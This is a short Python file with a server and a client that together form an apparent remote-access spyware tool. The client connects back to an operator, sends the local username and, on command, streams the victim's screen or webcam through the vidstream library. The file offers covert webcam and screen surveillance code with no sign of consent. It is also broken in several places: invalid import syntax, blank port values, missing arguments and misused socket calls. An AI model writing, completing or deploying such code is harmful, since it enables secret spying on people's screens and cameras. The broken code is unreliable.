####################################################### server

import vidstream import *
import socket
import os

local_ip_address = socket.gethostbyname(socket.gethostname())
socket_port = 

s = socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((local_ip_address, socket_port))
s.listen()

client, addr = s.accept()
network_name = client.recv().decode("utf-8")

print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")

server = StreamingServer(local_ip_address, )
server.start_server()

print("[~] Server started")

while True:
    cmd = input(f"{addr[0]}@{network_name}~# ")
    if cmd == "screen":
        client.send(cmd.encode("utf-8"))
    elif cmd == "webcam":
        client.send(cmd.encode("utf-8"))
    elif cmd == "clear":
        os.system("cls")


###################################################### client

from vidstream import *
import socket
import getpass

host = ""
socket_port = 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, socket_port))

s.send(str(getpass.getuser()).encode("utf-8"))

while True:
    cmd_data = s.recv().decode("utf-8")

    if cmd_data == "screen":
        screen = ScreenShareClient(host, )
        screen.start_stream()
    elif cmd_data == "webcam":
        camera = CameraClient(host, )
        camera.start_stream()
